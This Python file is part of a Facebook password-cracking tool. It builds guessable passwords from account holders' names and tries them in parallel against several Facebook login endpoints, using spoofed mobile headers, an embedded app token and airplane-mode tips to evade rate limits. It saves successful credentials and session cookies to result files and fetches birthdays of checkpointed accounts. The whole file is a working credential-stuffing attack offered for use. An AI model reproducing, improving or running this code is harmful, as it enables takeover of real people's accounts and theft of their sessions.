#######################################################
# Name           : Brute Facebook (BF)                #
# File           : apcb.py                            #
# Author         : Moch Yayan Juan Alvredo XD.        #
# Github         : https://github.com/Yayan-XD        #
# Facebook       : https://www.facebook.com/KM39453   #
# Website        : https://www.yayanxd.my.id          #
# Python version : 3.11                               #
#######################################################

############# DON'T REMOVE THIS FUNCTIONS #############

import requests, re, random, datetime, time, os, base64
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
from concurrent.futures import ThreadPoolExecutor as Modol
from datetime import datetime

from yz.apk import Cek_Apk
from yz.cek import Cek_has
from .sett import Setting
from .apcz import Kontol

#---- MODULE RICH IN PYTHON -------
from rich import print as prints
from rich.console import Console
from rich.columns import Columns
from rich.panel import Panel
from rich.tree import Tree
# --- BULAN --------
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
current = datetime.now()
ha = current.day
op = bulan[nTemp]
ta = current.year
#------------------------------->
O = '\x1b[1;96m' # BIRU MUDA
H = '\x1b[1;92m' # HIJAU
M = '\x1b[1;91m' # MERAH
N = '\x1b[0m'    # WARNA MATI
#------------------------------->
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
############################################################################################

class Brute_crack:

    def __init__(self, oz):
        self.idd, self.apk, self.cp, self.ok, self.loop = [], [], [], [], 0
        self.iya, self.pwa = [], []
        self.idd = oz
        Setting().ua_mu()
        self.apkkkkkkkk()
        self.plerrrrrrr()

    def uaa_asu(self):
        try:uas=open("assets/.xx.txt", "r").read()
        except FileNotFoundError:
            try:uas=random.choice(open("assets/.ua.txt", "r").read().splitlines())
            except FileNotFoundError:uas = Kontol().AsuLo()
        return uas

    def ingfo(self):
        prints(Panel(f"         hasil OK di simpan ke -> [bold green]OK-{ha}-{op}-{ta}.txt[/]\n         hasil CP di simpan ke -> [bold yellow]CP-{ha}-{op}-{ta}.txt[/]", padding=(0,1), style="bold white", width=70, title="Hasil Tersimpan"))
        prints(Panel("[italic green]Proses Crack Sedang Berjalan, Mainkan Mode Pesawat Setiap 200 ID!", style="bold white", width=70))

    def apkkkkkkkk(self):
        prints(Panel("[[bold cyan]?[/]] tampilkan aplikasi terkait ([bold yellow]tidak di sarankan[/]) ([bold green]y[/]/[bold red]t[/])", padding=(0,2), style="bold white", width=70, title="[bold red]•[bold yellow]•[bold green]• APLIKASI •[bold yellow]•[bold red]•[/]"))
        crot = input(f"[{M}?{N}] pilih: ")
        if crot in[""]:prints(Panel(f"[[bold red![/]] jangan kosong", style="bold white", width=70));self.apkkkkkkkk()
        elif crot in["Y","y"]:self.apk.append("y")
        elif crot in["T","t"]:self.apk.append("t")
        else:prints(Panel(f"[[bold red![/]] y/t bro", style="bold white", width=70));self.apkkkkkkkk()

    def plerrrrrrr(self):
        wa = []
        wa.append(Panel.fit(f"[[bold cyan]1[/]] pass manual", padding=(0,2), style="bold white"))
        wa.append(Panel.fit(f"[[bold cyan]2[/]] pass gabung ", padding=(0,3), style="bold white"))
        wa.append(Panel.fit(f"[[bold cyan]3[/]] pass otomatis", padding=(0,2), style="bold white"))
        Console().print(Columns(wa))
        ___yayanganteng___ = input(f"[{O}?{N}] pilih: ")
        if ___yayanganteng___ in ["1","01"]:
            prints(Panel('[[bold cyan]![/]] kata sandi minimal 6 karakter, gunakan "[bold yellow],[/]" ([bold yellow]koma[/]) untuk kata sandi berikut nya', padding=(0,1), style="bold white", width=70))
            while True:
                pwek = input(f"[{O}?{N}] sandi : ")
                if pwek in[""," "]:
                    print(f"[{M}×{N}] jangan kosong bro kata sandi nya")
                elif len(pwek)<=5:
                    print(f"[{M}×{N}] kata sandi minimal 6 karakter")
                else:
                    def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
                        yan = input(f"[{O}*{N}] method : ")
                        if yan in [""," "]:
                            print(f"{N}[{M}×{N}] jangan kosong bro")
                        elif yan in ["01","1"]:
                            self.manual(ysc, "", "Api")
                        elif yan in ["02","2"]:
                            Setting().host()
                            pil = input(f"[{O}*{N}] host : ")
                            if pil in [""," "]:print(f"{N}[{M}×{N}] jangan kosong bro")
                            elif pil in ["01","1"]:self.manual(ysc, "free.facebook.com", "Val")
                            elif pil in ["02","2"]:self.manual(ysc, "mbasic.facebook.com", "Val")
                            elif pil in ["03","3"]:self.manual(ysc, "m.facebook.com", "Val")
                            else:print(f"{N}[{M}×{N}] input yang bener")
                        elif yan in ["03","3"]:
                            Setting().host()
                            jbw = input(f"[{O}*{N}] host : ")
                            if jbw in [""," "]:print(f"{N}[{M}×{N}] jangan kosong bro")
                            elif jbw in ["01","1"]:self.manual(ysc, "free.facebook.com", "Asi")
                            elif jbw in ["02","2"]:self.manual(ysc, "mbasic.facebook.com", "Asi")
                            elif jbw in ["03","3"]:self.manual(ysc, "m.facebook.com", "Asi")
                            else:print(f"{N}[{M}×{N}] input yang bener")
                        else:print(f"{N}[{M}×{N}] input yang bener")
                    prints(Panel(f"crack dengan sandi -> [ [bold red]{pwek} [/]]", style="bold white", width=70))
                    Setting().teks_login()
                    __yan__(pwek.split(","))
                    break
        elif ___yayanganteng___ in ["2","02"]:
            self.iya.append("ya")
            prints(Panel('[[bold cyan]![/]] kata sandi minimal 6 karakter, gunakan "[bold yellow],[/]" ([bold yellow]koma[/]) untuk kata sandi berikut nya', padding=(0,1), style="bold white", width=70))
            kata = input(f"[{M}?{N}] sandi: ")
            xxxx = kata.split(",")
            for i in xxxx:
                self.pwa.append(i)
            prints(Panel(f"kata sandi tambahan -> [ [bold red]{kata} [/]]", style="bold white", width=70))
            self.awokawok()
        elif ___yayanganteng___ in ["3","03"]:
            self.awokawok()
        else:print(f"[{M}!{N}] masukan nomor yang bener lah kontol");self.plerrrrrrr()

    def awokawok(self):
        Setting().teks_login()
        yan = input(f"[{O}*{N}] method : ")
        if yan in [""," "]:
            print(f"{N}[{M}×{N}] jangan kosong bro");self.awokawok()
        elif yan in ["01","1"]:
            self.password("", "Api")
        elif yan in ["02","2"]:
            Setting().host()
            pol = input(f"[{O}*{N}] host : ")
            if pol in [""," "]:print(f"{N}[{M}×{N}] jangan kosong bro")
            elif pol in ["01","1"]:self.password("free.facebook.com", "Val")
            elif pol in ["02","2"]:self.password("mbasic.facebook.com", "Val")
            elif pol in ["03","3"]:self.password("m.facebook.com", "Val")
            else:print(f"{N}[{M}×{N}] input yang bener");self.awokawok()
        elif yan in ["03","3"]:
            Setting().host()
            pil = input(f"[{O}*{N}] host : ")
            if pil in [""," "]:print(f"{N}[{M}×{N}] jangan kosong bro")
            elif pil in ["01","1"]:self.password("free.facebook.com", "Asi")
            elif pil in ["02","2"]:self.password("mbasic.facebook.com", "Asi")
            elif pil in ["03","3"]:self.password("m.facebook.com", "Asi")
            else:print(f"{N}[{M}×{N}] input yang bener");self.awokawok()
        else:print(f"{N}[{M}×{N}] input yang bener");self.awokawok()

    def Api(self, user, pasw):
        prog.update(des,description=f"{str(self.loop)}/{len(self.idd)} OK-:[bold green]{len(self.ok)}[/] CP-:[bold yellow]{len(self.cp)}[/]")
        prog.advance(des)
        for pw in pasw:
            try:
                ses=requests.Session()
                try:uas=open("assets/.xx.txt", "r").read()
                except:uas=Setting().panas()
                data = {"access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16", "sdk_version": {random.randint(1,26)}, "email": user, "locale": "en_US", "password": pw, "sdk": "android", "generate_session_cookies": "1", "sig": "4f648f21fb58fcd2aa1c65f35f441ef5"}
                head = {"Host": "graph.facebook.com", "x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)), "x-fb-sim-hni": str(random.randint(20000, 40000)),"x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "user-agent": uas, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
                xnxx = ses.post("https://graph.facebook.com/auth/login", params=data, headers=head, allow_redirects=False).json()
                if "session_key" in xnxx:
                    sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    cokz = ";".join(i["name"]+"="+i["value"] for i in xnxx["session_cookies"])
                    coki = (f"sb={sb};{cokz};m_pixel_ratio=1.25;dpr=1.25;wd=448x931;")
                    digi = random.choice([2])
                    digi = Setting().kentod(digi)
                    if "y" in self.apk:Cek_Apk(user, pw, coki, digi)
                    elif "t" in self.apk:
                        tree = Tree("")
                        tree.add(f"[bold green]{user}|{pw}")
                        tree.add(f"[bold green]{coki}ua={digi}")
                        prints(tree)
                    wrt = (f" [✓] {user}|{pw}|{coki}")
                    self.ok.append(wrt)
                    with open(f"results/OK/OK-{ha}-{op}-{ta}.txt", "a", encoding="utf-8") as r:
                        r.write(wrt+"\n")
                    break
                elif "www.facebook.com" in xnxx["error"]["message"]:
                    wrt = (f" [×] {user}|{pw}")
                    self.cp.append(wrt)
                    self.cek_ttl(user, pw)
                    break
                else:continue
            #except Exception as e:prints(e)
            except requests.exceptions.ConnectionError:
                prog.update(des,description=f"[[bold red]spam[/]] {str(self.loop)}/{len(self.idd)} OK-:[bold green]{len(self.ok)}[/] CP-:[bold yellow]{len(self.cp)}[/]")
                prog.advance(des)
                time.sleep(5)

        self.loop+=1

    def validate(self, user, pasw, curl):
        prog.update(des,description=f"{str(self.loop)}/{len(self.idd)} OK-:[bold green]{len(self.ok)}[/] CP-:[bold yellow]{len(self.cp)}[/]")
        prog.advance(des)
        for pw in pasw:
            try:
                uas = self.uaa_asu()
                ses = requests.Session()
                link = ses.get(f"https://{curl}/login/device-based/password/?uid={user}&flow=login_no_pin&next=https%3A%2F%2F{curl}%2Facredirect%2F%3Fdeeplink_destination%3Dupgrade_account%26entrypoint%3Dmfb_m_site%26wtsid%3Drdr_0xZJHTvuyCTnctKLI&refsrc=deprecated&wtsid=rdr_0xZJHTvuyCTnctKLI&_rdr")
                data = {"jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),"lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),"uid": user,"next": f"https://{curl}/login/save-device/","flow": "login_no_pin","pass":pw}
                headd = {"Host": curl,"content-length": "338","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://"+curl,"content-type": "application/x-www-form-urlencoded","user-agent": uas,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": link.url,"accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
                post = ses.post(f'https://{curl}/login/device-based/validate-password/?shbl=0',data=data,headers=headd,allow_redirects=False)
                if "c_user" in ses.cookies.get_dict():
                    digi = random.choice([2])
                    digi = Setting().kentod(digi)
                    coki = Setting().ngoxok(ses.cookies.get_dict())
                    if "y" in self.apk:Cek_Apk(user, pw, coki, digi)
                    elif "t" in self.apk:
                        tree = Tree("")
                        tree.add(f"[bold green]{user}|{pw}")
                        tree.add(f"[bold green]{coki}ua={digi}")
                        prints(tree)
                    wrt = (f" [✓] {user}|{pw}|{coki}")
                    self.ok.append(wrt)
                    with open(f"results/OK/OK-{ha}-{op}-{ta}.txt", "a", encoding="utf-8") as r:
                        r.write(wrt+"\n")
                    break
                elif "checkpoint" in ses.cookies.get_dict():
                    wrt = (f" [×] {user}|{pw}")
                    self.cp.append(wrt)
                    self.cek_ttl(user, pw)
                    break
                else:continue
            #except Exception as e:prints(e)
            except requests.exceptions.ConnectionError:
                prog.update(des,description=f"[[bold red]spam[/]] {str(self.loop)}/{len(self.idd)} OK-:[bold green]{len(self.ok)}[/] CP-:[bold yellow]{len(self.cp)}[/]")
                prog.advance(des)
                time.sleep(5)

        self.loop+=1

    def reguller(self, user, pasw, curl):
        prog.update(des,description=f"{str(self.loop)}/{len(self.idd)} OK-:[bold green]{len(self.ok)}[/] CP-:[bold yellow]{len(self.cp)}[/]")
        prog.advance(des)
        for pw in pasw:
            try:
                uas = self.uaa_asu()
                ses = requests.Session()
                ses.headers.update({"Host":curl,"upgrade-insecure-requests":"1","user-agent":uas,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":f"https://{curl}/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
                xzx = ses.get(f"https://{curl}/login/?email={user}").text
                dat = {
                    "lsd": re.search('name="lsd" value="(.*?)"', str(xzx)).group(1),
                    "jazoest": re.search('name="jazoest" value="(.*?)"', str(xzx)).group(1),
                    "m_ts": re.search('name="m_ts" value="(.*?)"', str(xzx)).group(1),
                    "li": re.search('name="li" value="(.*?)"', str(xzx)).group(1),
                    "email": user,
                    "pass": pw
                }
                ses.headers.update({'Host': curl,'cache-control': 'max-age=0','upgrade-insecure-requests': '1','origin': curl,'content-type': 'application/x-www-form-urlencoded','user-agent': uas,'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-user': 'empty','sec-fetch-dest': 'document','referer': f'https://{curl}/login/?email={user}','accept-encoding':'gzip, deflate br','accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})
                ses.post(f"https://{curl}/login/device-based/regular/login/?shbl=1&refsrc=deprecated", data=dat, allow_redirects=False)
                if "c_user" in ses.cookies.get_dict():
                    digi = random.choice([2])
                    digi = Setting().kentod(digi)
                    coki = Setting().ngoxok(ses.cookies.get_dict())
                    if "y" in self.apk:Cek_Apk(user, pw, coki, digi)
                    elif "t" in self.apk:
                        tree = Tree("")
                        tree.add(f"[bold green]{user}|{pw}")
                        tree.add(f"[bold green]{coki}ua={digi}")
                        prints(tree)
                    wrt = (f" [✓] {user}|{pw}|{coki}")
                    self.ok.append(wrt)
                    with open(f"results/OK/OK-{ha}-{op}-{ta}.txt", "a", encoding="utf-8") as r:
                        r.write(wrt+"\n")
                    break
                elif "checkpoint" in ses.cookies.get_dict():
                    wrt = (f" [×] {user}|{pw}")
                    self.cp.append(wrt)
                    self.cek_ttl(user, pw)
                    break
                else:continue
            #except Exception as e:prints(e)
            except requests.exceptions.ConnectionError:
                prog.update(des,description=f"[[bold red]spam[/]] {str(self.loop)}/{len(self.idd)} OK-:[bold green]{len(self.ok)}[/] CP-:[bold yellow]{len(self.cp)}[/]")
                prog.advance(des)
                time.sleep(5)

        self.loop+=1

    def manual(self, pwek, host, asww):
        self.ingfo()
        global prog,des
        prog = Progress(SpinnerColumn("clock"),TextColumn("{task.description}"),BarColumn(),TextColumn("[progress.percentage]{task.percentage:>3.0f}%"))
        des = prog.add_task("",total=len(self.idd))
        with prog:
            with Modol(max_workers=30) as bool:
                for i in self.idd:
                    try:
                        user = i.split("<=>")[0]
                        if "Api" in asww:bool.submit(self.Api, user, pwek)
                        elif "Val" in asww:bool.submit(self.validate, user, pwek, host)
                        elif "Asi" in asww:bool.submit(self.reguller, user, pwek, host)
                        else:bool.submit(self.reguller, user, pwek, host)
                    except:pass
        Cek_has().hasil(self.ok, self.cp)

    def password(self, host, curl):
        self.ingfo()
        global prog,des
        prog = Progress(SpinnerColumn("clock"),TextColumn("{task.description}"),BarColumn(),TextColumn("[progress.percentage]{task.percentage:>3.0f}%"))
        des = prog.add_task("",total=len(self.idd))
        with prog:
            with Modol(max_workers=30) as bool:
                for user in self.idd:
                    uid, nama = user.split("<=>")[0], user.split("<=>")[1].lower()
                    obj = nama.split(" ")
                    try:
                        if len(obj) == 1:
                            pwx = [
                                obj[0]+'123', obj[0]+'1234',
                                obj[0]+'12345',
                            ]
                        elif len(obj) == 2:
                            pwx = [
                                obj[0]+'123', obj[0]+'12345',
                                obj[1]+'123', obj[1]+'12345',
                            ]
                        elif len(obj) == 3:
                            pwx = [
                                obj[0]+'123', obj[0]+'12345',
                                obj[1]+'123', obj[1]+'12345',
                                obj[2]+'123', obj[2]+'12345',
                            ]
                        elif len(obj) == 4:
                            pwx = [
                                obj[0]+'123', obj[0]+'12345',
                                obj[1]+'123', obj[1]+'12345',
                                obj[2]+'123', obj[2]+'12345',
                                obj[3]+'123', obj[3]+'12345',
                            ]
                        else:
                            pwx = [
                                obj[0]+'01', obj[0]+'03',
                                obj[0]+'02',
                            ]

                        if "ya" in self.iya:
                            for kontol in self.pwa:
                                pwx.append(kontol)
                        if "Api" in curl:bool.submit(self.Api, uid, pwx)
                        elif "Val" in curl:bool.submit(self.validate, uid, pwx, host)
                        elif "Asi" in curl:bool.submit(self.reguller, uid, pwx, host)
                        else:bool.submit(self.reguller, uid, pwx, host)
                    except:pass
        Cek_has().hasil(self.ok, self.cp)

    def cek_ttl(self, user, pasw):
        ses = requests.Session()
        try:
            cookie = {"cookie": open("assets/.cokie.txt", "r").read()}; tokenz = open("assets/.token.txt", "r").read()
            tangga = ses.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}", cookies=cookie).json()["birthday"]
            month, day, year = tangga.split("/")
            month = bulan_ttl[month]
            tree = Tree("")
            tree.add(f"[bold yellow]{user}|{pasw}|{day} {month} {year}")
            prints(tree)
            wrt = (f" [×] {user}|{pasw}|{day} {month} {year}")
            with open(f"results/CP/CP-{ha}-{op}-{ta}.txt", "a", encoding="utf-8") as w:
                w.write(wrt+"\n")
        except:
            tree = Tree("")
            tree.add(f"[bold yellow]{user}|{pasw}")
            prints(tree)
            wrt = (f" [×] {user}|{pasw}")
            with open(f"results/CP/CP-{ha}-{op}-{ta}.txt", "a", encoding="utf-8") as w:
                w.write(wrt+"\n")